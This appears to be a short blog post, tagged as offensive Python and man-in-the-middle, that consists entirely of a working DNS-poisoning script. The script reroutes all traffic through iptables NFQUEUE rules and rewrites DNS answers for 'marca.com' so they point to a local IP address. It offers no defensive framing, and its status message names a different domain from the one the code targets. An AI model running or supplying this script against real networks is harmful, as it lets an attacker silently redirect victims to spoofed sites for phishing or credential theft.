---
layout: single
title: DNS Poisoning - Python
excerpt: "DNS Poisoning (MITM Attack)."
date: 2025-03-16
classes: wide
header:
  teaser: /img2/images/python.jpg"
  teaser_home_page: true
  icon: /img2/python.ico
categories:
  - Python
  - Scripts
tags:
  - Python Ofensivo
  - MITM
---

```python
import netfilterqueue
import scapy.all as scapy
import signal
import sys
import os
from termcolor import colored


def def_handler(sig,frame):
  print(colored(f"\n[+] Saliendo...\n","red"))
  drequirements()
  sys.exit(1)


signal.signal(signal.SIGINT,def_handler)


def process_packet(packet):

  scapy_packet= scapy.IP(packet.get_payload())


  if scapy_packet.haslayer(scapy.DNSRR):
    qname = scapy_packet[scapy.DNSQR].qname

    if b"marca.com" in qname:
      print(f"\n[+] Envenenando el dominio hack4u.io")

      answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.149")
      scapy_packet[scapy.DNS].an = answer
      scapy_packet[scapy.DNS].ancount =1

      del scapy_packet[scapy.IP].len
      del scapy_packet[scapy.IP].chksum
      del scapy_packet[scapy.UDP].len
      del scapy_packet[scapy.UDP].chksum

      packet.set_payload(scapy_packet.build())

  packet.accept()


def requirements():
  os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")
  os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
  os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
  os.system("iptables --policy FORWARD ACCEPT")


def drequirements():
  os.system("iptables -D INPUT -j NFQUEUE --queue-num 0")
  os.system("iptables -D OUTPUT -j NFQUEUE --queue-num 0")
  os.system("iptables -D FORWARD -j NFQUEUE --queue-num 0")
  os.system("iptables --policy FORWARD ACCEPT")


def main():
  requirements()
  queue = netfilterqueue.NetfilterQueue() 
  queue.bind(0,process_packet)
  queue.run()


if __name__ == '__main__':
  main()
  ```